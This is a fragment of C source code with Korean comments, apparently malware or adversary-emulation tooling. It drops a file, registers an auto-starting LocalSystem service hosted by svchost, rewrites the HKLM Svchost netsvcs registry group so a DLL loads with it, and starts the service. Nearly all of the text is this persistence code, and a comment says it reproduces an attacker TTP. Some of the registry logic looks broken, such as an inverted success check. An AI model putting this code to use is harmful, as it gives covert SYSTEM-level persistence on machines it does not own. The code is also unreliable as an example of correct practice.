// --- 파일 드롭 함수 (WinAPI 대신 간단한 C File I/O 사용) ---
BOOL DropFile(const char* path, const unsigned char* data, unsigned int size) {
    FILE *fp = fopen(path, "wb");
    if (fp == NULL) return FALSE;
    
    if (fwrite(data, 1, size, fp) != size) {
        fclose(fp);
        return FALSE;
    }
    fclose(fp);
    return TRUE;
}


// --- 서비스 등록 및 시작 함수 (SYSTEM 권한 필요) ---
BOOL RegisterAndStartService() {
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCM == NULL) {
        printf("Error: OpenSCManager failed (%lu).\n", GetLastError());
        return FALSE;
    }

    // 1. 서비스 등록
    SC_HANDLE hService = CreateServiceW(
        hSCM,
        SERVICE_NAME,
        SERVICE_DISPLAY_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_SHARE_PROCESS, // svchost.exe에 로드될 때의 유형 (SERVICE_SHARED_PROCESS)
        SERVICE_AUTO_START,          // 자동 시작 (Persistence)
        SERVICE_ERROR_NORMAL,
        SERVICE_LOAD_PATH,           // %SystemRoot%\System32\svchost.exe -k netsvcs
        SERVICE_GROUP,               // netsvcs 그룹
        NULL,
        NULL,
        L"LocalSystem",              // SYSTEM 권한으로 실행
        NULL);

    if (hService == NULL) {
        printf("Error: CreateService failed (%lu). Attempting to open existing service.\n", GetLastError());
        // 이미 등록되어 있을 경우 핸들만 가져옴
        hService = OpenServiceW(hSCM, SERVICE_NAME, SERVICE_ALL_ACCESS);
        if (hService == NULL) {
            CloseServiceHandle(hSCM);
            return FALSE;
        }
    }

    // 2. DLL 로드를 위한 레지스트리 조작
    if (!AddDllToSvchostGroup(DLL_BASENAME, SERVICE_GROUP)) {
        printf("Error: Failed to modify Svchost registry key.\n");
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return FALSE;
    }
    printf("Info: Svchost registry key modified to load DLL.\n");


    // 3. 서비스 즉시 시작 (Execution)
    BOOL bStart = StartService(hService, 0, NULL);
    if (!bStart) {
        printf("Error: StartService failed (%lu).\n", GetLastError());
    }
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    
    return bStart;
}


// --- Svchost 그룹에 DLL 이름 추가 함수 (레지스트리 조작) ---
BOOL AddDllToSvchostGroup(const wchar_t* dllName, const wchar_t* groupName) {
    HKEY hKey;
    wchar_t subKeyPath[256];
    
    // HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost\[netsvcs]
    swprintf(subKeyPath, 256, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\\%ls", groupName);
    
    // 레지스트리 키 열기 (SYSTEM 권한 필요)
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subKeyPath, 0, KEY_READ | KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }

    // 현재 Service List 값을 읽어와서 새 DLL 이름을 추가합니다.
    DWORD dwType;
    DWORD dwSize = 0;
    
    // 버퍼 크기 확인
    if (RegQueryValueExW(hKey, L"ServiceGroup", NULL, &dwType, NULL, &dwSize) != ERROR_SUCCESS && dwSize > 0) {
        // 실제 값 읽기
        wchar_t* currentServices = (wchar_t*)malloc(dwSize + (wcslen(dllName) + 2) * sizeof(wchar_t));
        RegQueryValueExW(hKey, L"ServiceGroup", NULL, &dwType, (LPBYTE)currentServices, &dwSize);
        
        // 새 DLL 이름을 추가
        wchar_t* p = currentServices;
        while (*p) p += wcslen(p) + 1; // 끝으로 이동
        wcscpy(p, dllName);
        p += wcslen(dllName) + 1;
        *p = L'\0'; // 멀티스트링 종료

        // 새 값을 레지스트리에 쓰기
        RegSetValueExW(hKey, L"ServiceGroup", 0, REG_MULTI_SZ, (LPBYTE)currentServices, dwSize + (wcslen(dllName) + 2) * sizeof(wchar_t));
        
        free(currentServices);
    } else {
        // ServiceGroup 값이 없거나 읽기 실패 시, 새 값으로 덮어씁니다.
        // TTP 재현 시에는 간단히 멀티 스트링으로 새 값을 설정하는 것이 현실적입니다.
        wchar_t newServices[256];
        int len = 0;
        wcscpy(newServices + len, dllName);
        len += wcslen(dllName) + 1;
        newServices[len] = L'\0'; // 멀티스트링 종료
        
        RegSetValueExW(hKey, L"ServiceGroup", 0, REG_MULTI_SZ, (LPBYTE)newServices, (len + 1) * sizeof(wchar_t));
    }

    RegCloseKey(hKey);
    return TRUE;
}
